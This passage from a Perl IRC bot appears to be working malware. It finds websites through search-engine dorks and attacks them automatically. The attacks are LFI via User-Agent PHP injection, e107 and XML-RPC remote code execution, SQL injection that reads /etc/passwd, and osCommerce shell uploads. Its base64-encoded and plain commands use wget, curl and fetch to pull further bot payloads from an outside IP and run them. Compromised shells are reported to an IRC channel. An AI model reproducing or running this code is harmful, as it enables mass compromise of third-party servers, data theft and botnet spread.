            my $vuln = "http://".$site."0".$bug.$dir."/proc/self/environ%0000";
            my $shell = "http://".$site."0".$bug.$dir."/tmp/aanK%0000";
            my $html = &get_content($test);
            if ($html =~ /DOCUMENT_ROOT=\// && $html =~ /HTTP_USER_AGENT/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $code = 'echo "c0li#".php_uname()."#c0li".get_current_user();if(@copy("'.$injector.'","/tmp/aanK")) { echo "SUCCESS";@copy("'.$botak.'","/tmp/dev"); }';
                    my $res = lfi_env_query($test,encode_base64($code));
				    &lfi_spread_query($test);
					&get_content("http://".$site.$bug.$dir."/tmp/aanK%0000");
                    $res =~ s/\n//g;
                    if ($res =~ /c0li#(.*)#c0li(.*)SUCCESS/sg) {
                        my $sys = $1;
						$nob0dy = $2;
                        &msg("$chan","0,1$lfilogo(4@8$engine15)15(13@12SHeLL15)10 ".$shell." 15(4@3".$sys."15))15(4@3$nob0dy15)");sleep(2);
                    }
                    elsif ($res =~ /c0li#(.*)#c0li(.*)/sg) {
                        if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                            my $sys = $1;
							$nob0dy = $2;
                            my $upload = 'system("killall -9 perl;killall -9 php;wget '.$injector.' -O mail.php;fetch '.$injector.';mv logs mail.php;wget '.$botak.' -O tmp.php;fetch '.$botak.';mv ntah.jpg tmp.php;");passthru("killall -9 perl;killall -9 php;wget '.$injector.' -O mail.php;fetch '.$injector.';logs mail.php;wget '.$botshell.' -O tmp.php;fetch '.$botshell.';mv ntah.jpg tmp.php;");';
                            my $wget = lfi_env_query($test,encode_base64($upload)); sleep(2);
                            my $check = &get_content("http://".$site.$bug.$dir."/tmp/aanK%0000"); sleep(2);
                            if ($check =~ /Hacked by aanK/) {
                                &msg("$chan","0,1$lfilogo(4@8$engine15)15(13@11SHeLL15)10 ".$shell." 15(4@3".$sys."15)15(4@3$nob0dy15)");sleep(2);
								&msg("$admin","0,1$lfilogo(4@8$engine15)15(13@11SHeLL15)10 ".$shell." 15(4@3".$sys."15)15(4@3$nob0dy15)");sleep(2);
                            }   
                            else {
                                &msg("$chan","0,1$lfilogo(4@8$engine15)15(13@12SysTem15)10 ".$vuln." 15(4@3".$sys."15))15(4@3$nob0dy15)");sleep(2);
                            }
                        } exit; }
                    }
                    else { &msg("$chan","0,1$lfilogo(4@8$engine15)15(13@12EnviRon15)10 ".$vuln); }
                } exit; } sleep(2);
            }
        }
    }
}

sub lfi_env_query() {
    my $url = $_[0];
    my $code = $_[1];
    my $ua = LWP::UserAgent->new(agent => "<?eval(base64_decode('".$code."'));?>");
    $ua->timeout(7);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}

sub lfi_spread_query() {
    my $url = $_[0];
    my $code = "system('cd /tmp;rm -rf dor.* *.jpg.*;fetch ".$botak.";php ntah.jpg;rm -rf ntah.jpg;wget ".$botak.";php ntah.jpg;rm -rf ntah.jpg;curl -O ".$botak.";php ntah.jpg;rm -rf ntah.jpg;lwp-download ".$botshell.";perl xpl.txt;cd /var/tmp;fetch ".$botshell.";perl xpl.txt;rm -rf xpl.txt;wget ".$botshell.";perl xpl.txt;rm -rf xml.txt;curl -O ".$botshell.";perl xml.txt;rm -rf xml.txt;lwp-download ".$botshell.";perl xpl.txt;rm -rf *.jp*;');";
    my $ua = LWP::UserAgent->new(agent => "<?eval(base64_decode('".encode_base64($code)."'));?>");
    $ua->timeout(7);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
}

sub e107() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$e107logo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","0,1$e107logo(4@8$engine15)10 Scan finish"); }
            my $test = "http://".$site.$bug;
            my $code = "ZWNobyAidjBwQ3Izdzxicj4iOw0KZWNobyAic3lzOiIucGhwX3VuYW1lKCkuIjxicj4iOw0KJGNtZD0iZWNobyBub2IwZHlDcjN3IjsNCiRlc2VndWljbWQ9ZXgoJGNtZCk7DQplY2hvICRlc2VndWljbWQ7DQpmdW5jdGlvbiBleCgkY2ZlKXsNCiRyZXMgPSAnJzsNCmlmICghZW1wdHkoJGNmZSkpew0KaWYoZnVuY3Rpb25fZXhpc3RzKCdleGVjJykpew0KQGV4ZWMoJGNmZSwkcmVzKTsNCiRyZXMgPSBqb2luKCJcbiIsJHJlcyk7DQp9DQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdzaGVsbF9leGVjJykpew0KJHJlcyA9IEBzaGVsbF9leGVjKCRjZmUpOw0KfQ0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc3lzdGVtJykpew0KQG9iX3N0YXJ0KCk7DQpAc3lzdGVtKCRjZmUpOw0KJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsNCkBvYl9lbmRfY2xlYW4oKTsNCn0NCmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3Bhc3N0aHJ1Jykpew0KQG9iX3N0YXJ0KCk7DQpAcGFzc3RocnUoJGNmZSk7DQokcmVzID0gQG9iX2dldF9jb250ZW50cygpOw0KQG9iX2VuZF9jbGVhbigpOw0KfQ0KZWxzZWlmKEBpc19yZXNvdXJjZSgkZiA9IEBwb3BlbigkY2ZlLCJyIikpKXsNCiRyZXMgPSAiIjsNCndoaWxlKCFAZmVvZigkZikpIHsgJHJlcyAuPSBAZnJlYWQoJGYsMTAyNCk7IH0NCkBwY2xvc2UoJGYpOw0KfX0NCnJldHVybiAkcmVzOw0KfQ==";
            my $html = &e107_rce_query($test,$code);
            if ($html =~ /v0pCr3w<br>sys:(.+?)<br>nob0dyCr3w/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $sys = $1;
                    my $upload = 'if(@copy("'.$injector.'","mail.php")) { echo "c0liSUKSESc0li";@copy("'.$botak.'","tmp.php");} elseif(@copy("'.$injector.'","./e107_themes/mail.php")) { echo "stun_dthem";@copy("'.$botak.'","./e107_themes/tmp.php");} elseif(@copy("'.$injector.'","./e107_plugins/mail.php")) { echo "stun_dplug";@copy("'.$botak.'","./e107_plugins/tmp.php");} elseif(@copy("'.$injector.'","./e107_images/mail.php")) { echo "stun_dima";@copy("'.$botak.'","./e107_images/tmp.php");}';
                    my $res = &e107_rce_query($test,encode_base64($upload));
                    if ($res =~ /c0liSUKSESc0li/) {
						&get_content("http://".$site."tmp.php");
                        &msg("$chan","0,1$e107logo(4@8$engine15)15(13@12SheLL15)10 http://".$site."12mail.php 15(4@3".$sys."15)(4@12safemode-off15)");sleep(2);
                    }
                    elsif ($res =~ /stun_dthem/) {
						&get_content("http://".$site."e107_themes/tmp.php");
                        &msg("$chan","0,1$e107logo(4@8$engine15)15(13@12SheLL15)10 http://".$site."e107_themes/12mail.php 15(4@3".$sys."15)(4@12safemode-off15)");sleep(2);
                    }
                    elsif ($res =~ /stun_dplug/) {
						&get_content("http://".$site."e107_plugins/tmp.php");
                        &msg("$chan","0,1$e107logo(4@8$engine15)15(13@12SheLL15)10 http://".$site."e107_plugins/12mail.php 15(4@3".$sys."15)(4@12safemode-off15)");sleep(2);
                    }
                    elsif ($res =~ /stun_dima/) {
						&get_content("http://".$site."e107_images/tmp.php");
                        &msg("$chan","0,1$e107logo(4@8$engine15)15(13@12SheLL15)10 http://".$site."e107_images/12mail.php 15(4@3".$sys."15)(4@12safemode-off15)");sleep(2);
                    }
                    else {
                        &msg("$chan","0,1$e107logo(4@8$engine15)15(13@12Vuln15)10 ".$test." 15(4@3".$sys."15)(4@12safemode-off15)");sleep(2);
                    }
                    &e107_spread_query($test);
                    sleep(2);
                } exit; } sleep(2);
            }
            elsif ($html =~ /v0pCr3w<br>sys:(.+?)<br>/) {
                if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
                    my $sys = $1;
                    my $upload = 'if(@copy("'.$injector.'","mail.php")) { echo "c0liSUKSESc0li";@copy("'.$botshell.'","tmp.php");} elseif(@copy("'.$injector.'","./e107_themes/mail.php")) { echo "stun_dthem";@copy("'.$botshell.'","./e107_themes/tmp.php");} elseif(@copy("'.$injector.'","./e107_plugins/mail.php")) { echo "stun_dplug";@copy("'.$botshell.'","./e107_plugins/tmp.php");} else (@copy("'.$injector.'","./e107_images/mail.php")) { echo "stun_dima";@copy("'.$botshell.'","./e107_images/tmp.php");}';
                    my $res = &e107_rce_query($test,encode_base64($upload));
                    if ($res =~ /c0liSUKSESc0li/) {
						&get_content("http://".$site."tmp.php");
                        &msg("$chan","0,1$e107logo(4@8$engine15)15(13@12SheLL15)10 http://".$site."12mail.php 15(4@3".$sys."15)(4@4safemode-on15)");sleep(2);
                    }
                    if ($res =~ /stun_dthem/) {
						&get_content("http://".$site."e107_themes/tmp.php");
                        &msg("$chan","0,1$e107logo(4@8$engine15)15(13@12SheLL15)10 http://".$site."e107_themes/12mail.php 15(4@3".$sys."15)(4@4safemode-on15)");sleep(2);
                    }
                    if ($res =~ /stun_dplug/) {
						&get_content("http://".$site."e107_plugins/tmp.php");
                        &msg("$chan","0,1$e107logo(4@8$engine15)15(13@12SheLL15)10 http://".$site."e107_plugins/12mail.php 15(4@3".$sys."15)(4@4safemode-on15)");sleep(2);
                    }
                    if ($res =~ /stun_dima/) {
						&get_content("http://".$site."e107_images/tmp.php");
                        &msg("$chan","0,1$e107logo(4@8$engine15)15(13@12SheLL15)10 http://".$site."e107_images/12mail.php 15(4@3".$sys."15)(4@4safemode-on15)");sleep(2);
                    }
                    else {
                        &msg("$chan","0,1$e107logo(4@8$engine15)15(13@12Vuln15)10 ".$test." 15(4@3".$sys."15)(4@4safemode-on15)");sleep(2);
                    }
                sleep(2); } exit; }
            }
        }
    }
}

sub e107_rce_query() {
    my $url = $_[0];
    my $code = $_[1];
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=[php]eval(base64_decode('".$code."'))%3Bdie%28%29%3B%5B%2Fphp%5D");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $res = $ua->request($req);
    return $res->content;
}

sub e107_spread_query() {
    my $url = $_[0];
    my $code = "ZWNobyAidjBwQ3Izdzxicj4iOw0KZWNobyAic3lzOiIucGhwX3VuYW1lKCkuIjxicj4iOw0KJGNtZD0iZWNobyBub2IwZHlDcjN3O2NkIC90bXA7cm0gLXJmIGRvci4qICoudHh0Lio7ZmV0Y2ggaHR0cDovLzIxNy4xNi44LjIzL353ZWJtYWlsL3htbC50eHQ7cGVybCB4bWwudHh0O3JtIC1yZiB4bWwudHh0O3dnZXQgaHR0cDovLzIxNy4xNi44LjIzL353ZWJtYWlsL3htbC50eHQ7cGVybCB4bWwudHh0O3JtIC1yZiB4bWwudHh0O2N1cmwgLU8gaHR0cDovLzIxNy4xNi44LjIzL353ZWJtYWlsL3htbC50eHQ7cGVybCB4bWwudHh0O3JtIC1yZiB4bWwudHh0O2x3cC1kb3dubG9hZCBodHRwOi8vMjE3LjE2LjguMjMvfndlYm1haWwveG1sLnR4dDtwZXJsIHhtbC50eHQ7Y2QgL3Zhci90bXA7cm0gLXJmIGRvci4qICouanBnLio7ZmV0Y2ggaHR0cDovLzIxNy4xNi44LjIzL353ZWJtYWlsL3hwbC50eHQ7cGVybCB4cGwudHh0O3JtIC1yZiB4cGwudHh0O3dnZXQgaHR0cDovLzIxNy4xNi44LjIzL353ZWJtYWlsL3hwbC50eHQ7cGVybCB4cGwudHh0O3JtIC1yZiB4cGwudHh0O2N1cmwgLU8gaHR0cDovLzIxNy4xNi44LjIzL353ZWJtYWlsL3hwbC50eHQ7cGVybCB4cGwudHh0O3JtIC1yZiB4cGwudHh0O2x3cC1kb3dubG9hZCBodHRwOi8vMjE3LjE2LjguMjMvfndlYm1haWwveHBsLnR4dDtwZXJsIHhwbC50eHQ7IjsNCiRlc2VndWljbWQ9ZXgoJGNtZCk7ZWNobyAkZXNlZ3VpY21kOw0KZnVuY3Rpb24gZXgoJGNmZSl7DQokcmVzID0gJyc7DQppZiAoIWVtcHR5KCRjZmUpKXsNCmlmKGZ1bmN0aW9uX2V4aXN0cygnZXhlYycpKXsNCkBleGVjKCRjZmUsJHJlcyk7DQokcmVzID0gam9pbigiXG4iLCRyZXMpOw0KfQ0KZWxzZWlmKGZ1bmN0aW9uX2V4aXN0cygnc2hlbGxfZXhlYycpKXsNCiRyZXMgPSBAc2hlbGxfZXhlYygkY2ZlKTsNCn0NCmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3N5c3RlbScpKXsNCkBvYl9zdGFydCgpOw0KQHN5c3RlbSgkY2ZlKTsNCiRyZXMgPSBAb2JfZ2V0X2NvbnRlbnRzKCk7DQpAb2JfZW5kX2NsZWFuKCk7DQp9DQplbHNlaWYoZnVuY3Rpb25fZXhpc3RzKCdwYXNzdGhydScpKXsNCkBvYl9zdGFydCgpOw0KQHBhc3N0aHJ1KCRjZmUpOw0KJHJlcyA9IEBvYl9nZXRfY29udGVudHMoKTsNCkBvYl9lbmRfY2xlYW4oKTsNCn0NCmVsc2VpZihmdW5jdGlvbl9leGlzdHMoJ3BvcGVuJykpew0KJGYgPSBAcG9wZW4oJGNmZSwiciIpOw0Kd2hpbGUoIUBmZW9mKCRjZmUpKSB7ICRyZXMgLj0gQGZyZWFkKCRjZmUsMTAyNCk7IH0NCkBwY2xvc2UoJGYpOw0KfX0NCnJldHVybiAkcmVzOw0KfQ==";
    my $req = HTTP::Request->new(POST => $url);
    $req->content_type('application/x-www-form-urlencoded');
    $req->content("send-contactus=1&author_name=%5Bphp%5Deval(base64_decode('".$code."'))%3Bdie%28%29%3B%5B%2Fphp%5D");
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $res = $ua->request($req);
}

sub xml() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$xmllogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","0,1$xmllogo(4@8$engine15)10 Scan finish"); }
            my $test = "http://".$site.$bug;
            my $vuln = "http://".$site."12".$bug;
            my $html = &get_content($test);
            if ($html =~ /faultCode/ ) {
            if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            my $resp = &xml_cek_query($test);
			if ($resp =~ /j13mb0t(.*)j13mb0t/s) {
			&xml_spread_query($test);sleep(2);
			my $sys = $1;
			my $check = &get_content("http://".$site."mail.php");
				if ($check =~ /STUNSHELL/) {
				&msg("$chan","0,1$xmllogo(4@8$engine15)15(13@12SheLL15)10 http://".$site."12mail.php 3".$sys);&get_content("http://".$site."tmp.php"); sleep(2);}
				else { 
				&msg("$chan","0,1$xmllogo(4@8$engine15)15(13@12SysTem15)10 ".$vuln." 3".$sys); sleep(2);}
			}
	sleep(2); } exit; } }
		}
	}
}

sub xml_cek_query() {
    my $url 	= $_[0];
	my $code = "system('uname -a');";
    my $ua = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'j13mb0t';".$code."echo'j13mb0t';exit;/*</name></value></param></params></methodCall>";
	$ua->timeout(7);
	my $res = $ua->request(POST $url, Content_Type => 'text/xml', Content => $exploit);
    return $res->content;
}

sub xml_spread_query() {
my $xmltargt = $_[0];
my $xmlsprd  = "system('wget ".$injector." -O mail.php;fetch ".$injector.";mv stun.jpg mail.php;wget ".$botshell." -O tmp.php;fetch ".$botshell.";mv xml.txt tmp.php;killall -9 perl;killall -9 php;cd /tmp;rm -rf dor.* *.jpg.*;fetch ".$botshell.";php xml.txt;rm -rf xml.txt;wget ".$botshell.";php xml.txt;rm -rf xml.txt;curl -O ".$botshell.";php xml.txt;rm -rf xml.txt;lwp-download ".$botshell.";php xml.txt;cd /var/tmp;rm -rf dor.* *.jpg.*;fetch ".$botshell.";php xml.txt;rm -rf xml.txt;wget ".$botshell.";php xml.txt;rm -rf xml.txt;curl -O ".$botshell.";php xml.txt;rm -rf xml.txt;lwp-download ".$botshell.";php xml.txt;');";
		my $userAgent = LWP::UserAgent->new(agent => 'perl post');
        $exploit = "<?xml version=\"1.0\"?><methodCall>";
        $exploit .= "<methodName>test.method</methodName>";
        $exploit .= "<params><param><value><name>',''));";
        $exploit .= "echo'j13m';".$xmlsprd."echo'b0T';exit;/*</name></value></param></params></methodCall>";
	$userAgent->timeout(7);
my $response = $userAgent->request(POST $xmltargt, Content_Type => 'text/xml', Content => $exploit);
}

sub sql() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$sqllogo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","0,1$sqllogo(@8$engine15)10 Scan finish"); }
            my $test = "http://".$site.$bug."'";
            my $vuln = "http://".$site."12".$bug;
			my $sqlsite = "http://".$site.$bug;
            my $html = &get_content($test);
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ m/You have an error in your SQL syntax/i || $html =~ m/Query failed/i || $html =~ m/SQL query failed/i ) {
                &sqlbrute($sqlsite,$chan,$engine);}
            elsif ($html =~ m/ODBC SQL Server Driver/i || $html =~ m/Unclosed quotation mark/i || $html =~ m/Microsoft OLE DB Provider for/i ) {
                &msg("$chan","0,1$sqllogo(@8$engine15)15(13@12MsSQL15)4 ".$vuln);&sqlbrute($sqlsite,$chan,$engine);}
            elsif ($html =~ m/Microsoft JET Database/i || $html =~ m/ODBC Microsoft Access Driver/i || $html =~ m/Microsoft OLE DB Provider for Oracle/i ) {
                &msg("$chan","0,1$sqllogo(@8$engine15)15(13@12MsAccess15)4 ".$vuln);&sqlbrute($sqlsite,$chan,$engine);}
            elsif ($html =~ m/mysql_/i || $html =~ m/Division by zero in/i || $html =~ m/mysql_fetch_array/i ) {
                &sqlbrute($sqlsite,$chan,$engine);}
            } exit; sleep(2); }
        }
    }
}
sub sqlbrute() {
			my $situs=$_[0];
			my $chan  =$_[1];
			my $engine=$_[2];
			my $columns=20;
my $cfin.="--";
my $cmn.= "+";
for ($column = 0 ; $column < $columns ; $column ++)
	{
	$union.=','.$column;
	$inyection.=','."0x6c6f67696e70776e7a";
    if ($column == 0)
      {
		  $inyection = '';
          $union = '';
      }
    $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cfin;
    $response=get($sql);
    if($response =~ /loginpwnz/)
		{
         $column ++;
         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cfin;
		 &msg("$chan","0,1$sqllogo(@8$engine15)15(13@12SQL15)3 $sql ");
         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."information_schema.tables".$cfin;
         $response=get($sql)or die("[-] Impossible to get Information_Schema\n");
         if($response =~ /loginpwnz/)
         	{
         	$sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."information_schema.tables".$cfin;
			&msg("$chan","0,1$sqllogo(@8$engine15)15(13@12SQL15)(4@14INFO_SCHEMA14)3 $sql ");
         	}
         $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn."mysql.user".$cfin;
         $response=get($sql)or die("[-] Impossible to get MySQL.User\n");
         if($response =~ /loginpwnz/)
         	{
         	$sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn."mysql.user".$cfin;
			&msg("$chan","0,1$sqllogo(@8$engine15)15(13@12SQL15)(4@14USER14)3 $sql ");
         	}
         else
         	{
         	}
	while ($loadcont < $column-1)
	   {
		$loadfile.=','.'load_file(0x2f6574632f706173737764)';
		$loadcont++;
	   }
	   $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."load_file(0x2f6574632f706173737764)".$loadfile.$cfin;
	$response=get($sql)or die("[-] Impossible to inject LOAD_FILE\n");
         if($response =~ /root:x:/)
         	{
			&msg("$chan","0,1$sqllogo(@8$engine15)15(13@12SQL15)(4@14Load File14)3 $sql ");
			}
         else
         	{
         	}
	          foreach $tabla(@tabele)
                {
                  chomp($tabla);
                  $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0x6c6f67696e70776e7a".$inyection.$cmn."from".$cmn.$tabla.$cfin;
				 $response=get($sql)or die("[-] Impossible to get tables\n");
                  if($response =~ /loginpwnz/)
                    {
                    $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."0".$union.$cmn."from".$cmn.$tabla.$cfin;
					&msg("$chan","0,1$sqllogo(@8$engine15)15(13@12SQL15)(4@14Tabel14)3 $sql ");
					&tabelka($situs,$tabla,$chan,$engine);
                    }
                }
		}
	}			
}

sub tabelka() {
			my $situs =$_[0];
			my $tabla =$_[1];
			my $chan  =$_[2];
			my $engine=$_[3];
			my $cfin.="--";
			my $cmn.= "+";
            chomp($tabla);
            foreach $columna(@kolumny)
            {
             chomp($columna);
             $sql=$situs."-1".$cmn."union".$cmn."select".$cmn."concat(0x6c6f67696e70776e7a,0x3a,$columna)".$inyection.$cmn."from".$cmn.$tabla.$cfin;
             $response=get($sql)or die("[-] Impossible to get columns\n");
             if ($response =~ /loginpwnz/)
                {
				&msg("$chan","0,1$sqllogo(@8$engine15)15(13@12SQL15)(7@14SQLi Vuln14)3 $situs 14(4@14Kolom14)3 $columna 14(4@14Tabel14)3 $tabla ");
                }
            }
        
}

sub osco() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","0,1$oscologo(@8$engine15)10 Scan finish"); }
            my $test = "http://".$site.$bug;
            my $html = &get_content($test);
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ /Warning: No file uploaded/ ) {
#                &msg("$chan","0,1$oscologo(@8$engine15)15(13@12System15)4 ".$test);
				&osco_xpl($test,$chan,$site,$engine);
				} else { }
            } exit; sleep(2); }
        }
    }
}

sub osco_xpl() {
my $browser = LWP::UserAgent->new;
my $url    = $_[0];
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $res = $browser->post( $url,['products_image' => ['./stun.jpg' => 'mail.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resa = $browser->post( $url,['products_image' => ['./read.jpg' => 'read.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resb = $browser->post( $url,['products_image' => ['./xml.txt' => 'tmp.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
	my $hasil = $res->as_string;
	my $hasil1 = $resa->as_string;
	my $hasil2 = $resb->as_string;
	my $check = &get_content("http://".$site."images/mail.php");&get_content("http://".$site."images/tmp.php");sleep(3);
	if ($check =~ /STUNSHELL/) { 
	my $os 	   ="";
	my $free   ="";
	my $uid    ="";
    if ($check =~ m/<br>Uname -a :(.*?)<br>/) {$os = $1;}
    if ($check =~ m/Freespace : (.*?)<\/p>/) {$free = $1;}
    if ($check =~ m/id : uid=(.*?) gid=/) {$uid = $1;}
	&msg("$chan","0,1$oscologo(4@8$engine15)15(13@12SHeLL15)9 http://".$site."images/read.php 15(OS=$os) (free=$free) uid=$uid ");sleep(2);
	}
}

sub osco2() {
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $count = 0;
    my @list = &search_engine($chan,$bug,$dork,$engine,$oscologo);
    my $num = scalar(@list);
    if ($num > 0) {
        foreach my $site (@list) {
            $count++;
            if ($count == $num-1) { &msg("$chan","0,1$oscologo(@8$engine15)10 Scan finish"); }
            my $test = "http://".$site.$bug;
            my $html = &get_content($test);
			if (my $pid = fork) { waitpid($pid, 0); } else { if (fork) { exit; } else {
            if ($html =~ /TABLE_HEADING_FILENAME/ ) {
#                &msg("$chan","0,1$oscologo(@8$engine15)15(13@12System15)4 ".$test);
				&osco_xpl2($test,$chan,$site,$engine);
				} else { }
            } exit; sleep(2); }
        }
    }
}

sub osco_xpl2() {
my $browser = LWP::UserAgent->new;
my $url    = $_[0]."?action=processuploads";
my $chan   = $_[1];
my $site   = $_[2];
my $engine = $_[3];
my $res = $browser->post( $url,['file_1' => ['./stun.jpg' => 'mail.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resa = $browser->post( $url,['file_1' => ['./read.jpg' => 'read.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
my $resb = $browser->post( $url,['file_1' => ['./xml.txt' => 'tmp.php' => 'application/octet-stream']],'Content-Type' => 'form-data');
	my $hasil = $res->as_string;
	my $hasil1 = $resa->as_string;
	my $hasil2 = $resb->as_string;
	my $check = &get_content("http://".$site."images/read.php");&get_content("http://".$site."images/tmp.php");sleep(3);
	if ($check =~ /STUNSHELL/) { 
	my $os 	   ="";
	my $free   ="";
	my $uid    ="";
    if ($check =~ m/<br>Uname -a :(.*?)<br>/) {$os = $1;}
    if ($check =~ m/Freespace : (.*?)<\/p>/) {$free = $1;}
    if ($check =~ m/id : uid=(.*?) gid=/) {$uid = $1;}
	&msg("$chan","0,1$oscologo(4@8$engine15)15(13@12SHeLL15)9 http://".$site."images/read.php 15(OS=$os) (free=$free) uid=$uid ");sleep(2);
	}
}

#########################################

sub search_engine() {
    my (@total,@clean);
    my $chan = $_[0];
    my $bug = $_[1];
    my $dork = $_[2];
    my $engine = $_[3];
    my $logo = $_[4];
    if ($engine eq "GooGLe") { my @google = &google($dork); push(@total,@google); }
    if ($engine eq "ReDiff") { my @rediff = &rediff($dork); push(@total,@rediff); }
    if ($engine eq "Bing") { my @bing = &bing($dork); push(@total,@bing); }
    if ($engine eq "ALtaViSTa") { my @altavista = &altavista($dork); push(@total,@altavista); }
    if ($engine eq "YahOo") { my @yahoo = &yahoo($dork); push(@total,@yahoo); }
    if ($engine eq "AsK") { my @ask = &ask($dork); push(@total,@ask); }
    if ($engine eq "UoL") { my @uol = &uol($dork); push(@total,@uol); }
    if ($engine eq "CluSty") { my @clusty = &clusty($dork); push(@total,@clusty); }
    if ($engine eq "GutSer") { my @gutser = &gutser($dork); push(@total,@gutser); }
    if ($engine eq "GooGle2") { my @google2 = &google2($dork); push(@total,@google2); }
    if ($engine eq "ExaLead") { my @exalead = &exalead($dork); push(@total,@exalead); }
    if ($engine eq "LyCos") { my @lycos = &lycos($dork); push(@total,@lycos); }
    if ($engine eq "VirgiLio") { my @virgilio = &virgilio($dork); push(@total,@virgilio); }
    if ($engine eq "WebDe") { my @webde = &webde($dork); push(@total,@webde); }
    if ($engine eq "HotBot") { my @hotbot = &hotbot($dork); push(@total,@hotbot); }
    if ($engine eq "AoL") { my @aol = &aol($dork); push(@total,@aol); }
    if ($engine eq "SaPo") { my @sapo = &sapo($dork); push(@total,@sapo); }
    if ($engine eq "DuCk") { my @duck = &duck($dork); push(@total,@duck); }
    if ($engine eq "LyGo") { my @lygo = &lygo($dork); push(@total,@lygo); }
    if ($engine eq "YauSe") { my @yause = &yause($dork); push(@total,@yause); }
    if ($engine eq "BaiDu") { my @baidu = &baidu($dork); push(@total,@baidu); }
    if ($engine eq "KiPoT") { my @kipot = &kipot($dork); push(@total,@kipot); }
    if ($engine eq "GiBLa") { my @gibla = &gibla($dork); push(@total,@gibla); }
    if ($engine eq "BLacK") { my @black = &black($dork); push(@total,@black); }
    if ($engine eq "oNeT") { my @onet = &onet($dork); push(@total,@onet); }
    if ($engine eq "SiZuka") { my @sizuka = &sizuka($dork); push(@total,@sizuka); }
    if ($engine eq "WaLLa") { my @walla = &walla($dork); push(@total,@walla); }
    if ($engine eq "DeMos") { my @demos = &demos($dork); push(@total,@demos); }
    if ($engine eq "RoSe") { my @rose = &rose($dork); push(@total,@rose); }
    if ($engine eq "SeZnaM") { my @seznam = &seznam($dork); push(@total,@seznam); }
    if ($engine eq "TisCali") { my @tiscali = &tiscali($dork); push(@total,@tiscali); }
    if ($engine eq "NaVeR") { my @naver = &naver($dork); push(@total,@naver); }
    @clean = &clean(@total);
    &msg("$chan","0,1$logo(4@8$engine15)12 Total:4 (".scalar(@total).")12 Clean:4 (".scalar(@clean).")");
    return @clean;
}

#########################################

sub isFound() {
    my $status = 0;
    my $link = $_[0];
    my $reqexp = $_[1];
    my $res = &get_content($link);
    if ($res =~ /$reqexp/) { $status = 1 }
    return $status;
}

sub get_content() {
    my $url = $_[0];
    my $ua = LWP::UserAgent->new(agent => $uagent);
    $ua->timeout(7);
    my $req = HTTP::Request->new(GET => $url);
    my $res = $ua->request($req);
    return $res->content;
}

######################################### SEARCH ENGINE gibla

sub google() {
    my @list;
    my $key = $_[0];
    for (my $i=0; $i<=400; $i+=10){
        my $search = ("http://www.google.com/search?q=".&key($key)."&num=100&filter=0&start=".$i);
        my $res = &search_engine_query($search);
        while ($res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g) {
            if ($1 !~ /google/){
            my $link = $1;
                my @grep = &links($link);
                push(@list,@grep);
            }
        }
    }
    return @list;
}

sub rediff() {
    my @list;
    my $key = $_[0];
